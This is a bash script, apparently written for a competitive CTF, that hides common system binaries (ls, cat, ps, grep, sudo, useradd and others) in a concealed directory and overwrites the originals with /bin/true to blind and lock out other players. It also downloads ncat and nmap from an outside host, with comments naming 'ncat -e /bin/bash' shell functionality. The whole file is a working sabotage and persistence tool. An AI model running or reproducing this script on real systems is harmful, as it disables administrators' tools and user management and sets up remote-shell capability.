#!/usr/bin/env bash

target_path=/usr/bin/cageydinosaur

mkdir -p $target_path

# these commands are crucial for the script's functionality, copy them first
cp $(which cp) $target_path/cp
cp $(which mv) $target_path/mv

function delete {
	which_output=$(which $1)
	if [[ "$which_output" == *"not found"*  || "$which_output" == "" ]]; then
		echo "Command $1 not found"
		$target_path/cp /bin/true /usr/bin/$1 # even if command is not found,
		$target_path/cp /bin/true /bin/$1     # make a copy of /bin/true to fool other players

	elif [[ $which_output != *$target_path* ]]; then # skip if the path of the binary is in the target_path. Without this check, the binary would get overwritten with /bin/true
		$target_path/mv $which_output $target_path/$1 # make a copy of the executable for our own use
		$target_path/cp /bin/true $which_output # copy /bin/true to the path of the target executable
		$target_path/cp /bin/true /usr/bin/$1   # /bin/true does not output anything
		$target_path/cp /bin/true /bin/$1    
	fi
}

delete ls
delete vim
delete cat
delete echo
delete vi
delete nano
delete find
delete grep
delete ps
delete top
delete whoami
delete id
delete nc
delete wget
delete curl
delete awk
delete mkdir
delete rmdir
delete nmap

delete useradd
delete adduser
delete userdel
delete deluser
delete groupadd
delete addgroup
delete groupdel
delete delgroup
delete usermod
delete sudo

# using ncat to get ncat -e /bin/bash functionality
$target_path/wget http://ctf.danieltomov.me/ncat -O $target_path/ncat
chmod +x $target_path/ncat

# using ncat to get ncat -e /bin/bash functionality
$target_path/wget http://ctf.danieltomov.me/nmap -O $target_path/nmap
chmod +x $target_path/nmap

# Need these commands for the previous parts of thlse script
delete mv
delete cp

echo run \"'export PATH='$target_path:'$PATH'\" to add the binaries to your path